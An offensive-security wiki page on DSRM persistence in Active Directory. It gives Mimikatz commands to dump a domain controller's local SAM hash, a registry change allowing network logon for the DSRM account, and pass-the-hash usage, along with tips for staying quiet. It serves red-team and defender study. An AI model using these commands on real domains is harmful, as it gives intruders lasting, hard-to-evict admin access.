---
title: "DSRM: the domain controller's local backdoor account"
description: "Using the Directory Services Restore Mode local administrator of a domain controller for persistence: recovering its hash and setting DsrmAdminLogonBehavior so the DSRM account can authenticate over the network to the DC."
keywords:
  - DSRM
  - DsrmAdminLogonBehavior
  - SafeModePassword
  - domain controller
  - domain persistence
---

# DSRM

Every domain controller keeps a **local** `Administrator` account, separate from the domain's, used for **Directory Services Restore Mode** (DSRM). Its password is the SafeMode password set when the server was promoted, and it is almost never rotated. That makes it an ideal persistence account: recover its hash once, flip a registry value so it may log on over the network, and you keep DC administrator access even after every **domain** credential is reset.

## Setting it up

With SYSTEM/admin on a DC:

```text
# 1. Recover the DSRM account hash from the DC's local SAM
mimikatz: token::elevate ; lsadump::sam
# 2. Allow the DSRM account to authenticate over the network (not just at the console)
#    HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior = 2 (DWORD)
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f
```

Then authenticate to the DC with the DSRM hash by pass-the-hash:

```text
# The DSRM account is LOCAL to the DC, so authenticate with .\Administrator
sekurlsa::pth /domain:<DC-hostname> /user:Administrator /ntlm:<dsrm-nthash> /run:powershell.exe
```

## The key details

- `DsrmAdminLogonBehavior` values: `0`/absent = DSRM logon only while in restore mode; `1` = allowed when AD DS is stopped; **`2` = always allowed**, including normal network logon. Value `2` is the persistence enabler.
- The DSRM account is **local to that DC**, so you authenticate against the DC's hostname (`.\Administrator`), not the domain.
- Its hash is independent of the domain Administrator, so rotating domain passwords (even `krbtgt`) does **not** evict you; only resetting the DSRM password on that DC does.

## Exploitation notes

- This survives reboots and domain-wide password resets, making it sturdier than [Skeleton Key](skeleton-key.md); the trade-off is the one-time registry change.
- It gives local admin on the DC, which is domain compromise (dump NTDS, DCSync, etc.), so pair it with a quiet re-entry path.
- Each DC has its own DSRM account; set it on more than one DC for redundancy.

## Tools

- **Mimikatz** (`lsadump::sam`, `sekurlsa::pth`): recover the DSRM hash and use it.
- **Impacket / NetExec**: pass-the-hash to the DC's local Administrator once the regkey is set.

## References

- [ADSecurity: Sneaky AD Persistence #13, DSRM persistence v2 (Sean Metcalf)](https://adsecurity.org/?p=1785)
- [The Hacker Recipes: DSRM persistence](https://www.thehacker.recipes/ad/persistence/dsrm)
- [MITRE ATT&CK T1003.003 / directory data store](https://attack.mitre.org/techniques/T1003/003/)
